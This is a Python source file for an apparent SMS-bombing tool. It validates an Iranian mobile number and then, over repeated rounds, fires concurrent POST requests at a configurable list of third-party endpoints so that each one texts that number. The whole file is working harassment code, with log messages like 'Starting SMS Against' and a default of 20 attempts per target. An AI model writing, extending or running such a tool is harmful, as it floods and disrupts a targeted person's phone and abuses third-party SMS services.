import re
import logging
from urllib.parse import urlparse
from urllib3 import PoolManager, encode_multipart_formdata
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import settings

class SMSService:
    def __init__(self):
        self._setup_logging()
        self._http_client = PoolManager()
        self._targets = settings.SMS_TARGETS
        self._body_templates = settings.SMS_BODY_TEMPLATES

    def _setup_logging(self):
        logging.basicConfig(
            level=getattr(logging, settings.LOG_LEVEL.upper()),
            format='%(asctime)s - %(levelname)s : %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def _validation(self, phone: str) -> bool:
        return bool(re.match(r'^9\d{9}$', phone))

    def _get_body_template(self, url: str) -> dict:
        if url in self._body_templates:
            return self._body_templates[url]

        for template_url, body_template in self._body_templates.items():
            if template_url in url:
                return body_template

        return self._body_templates.get('default', {'phone': '0{phone}'})

    def _send(self, phone: str, url: str, offline: bool = False) -> dict:
        if offline:
            self.logger.info(f"OFFLINE: Send SMS -> +98{phone} via {url}")
            return {"url": url, "status": "offline", "success": True}
        try:
            body_template = self._get_body_template(url)
            formatted_body = {
                k: v.format(phone=phone) if isinstance(v, str) else v
                for k, v in body_template.items()
            }

            meo = encode_multipart_formdata(formatted_body)
            res = self._http_client.request(
                "POST",
                url,
                headers={"Content-Type": meo[1]},
                body=meo[0],
                timeout=2.0
            )

            success = 200 <= res.status < 300
            log_method = self.logger.info if success else self.logger.warning
            log_method(f"SMS to {phone} via {url} : {res.status}")
            return {
                "url": url,
                "status": res.status,
                "success": success,
                "body": formatted_body
            }
        except Exception as e:
            self.logger.error(f"Failed Send To SMS 0{phone} : {e}")
            return {"url": url, "status": "error", "success": False, "error": str(e)}

    def send_sms(self, phone_number: str, attempts: int = 20, offline: bool = False) -> dict:
        if not self._validation(phone_number):
            return {
                "success": False,
                "message": f"Invalid phone Number: {phone_number}"
            }
        self.logger.info(f"Starting SMS Against +98{phone_number}")
        results = []
        s = 0
        while s < attempts:
            with ThreadPoolExecutor(max_workers=len(self._targets)) as executor:
                futures = [
                    executor.submit(self._send, phone_number, url, offline)
                    for url in self._targets
                ]
                for future in as_completed(futures):
                    results.append(future.result())
            s += 1

        success_count = sum(1 for result in results if result['success'])
        return {
            "success": success_count > 0,
            "message": f"Sent {success_count}/{len(self._targets)} SMS after {attempts} attempts",
            "details": results
        }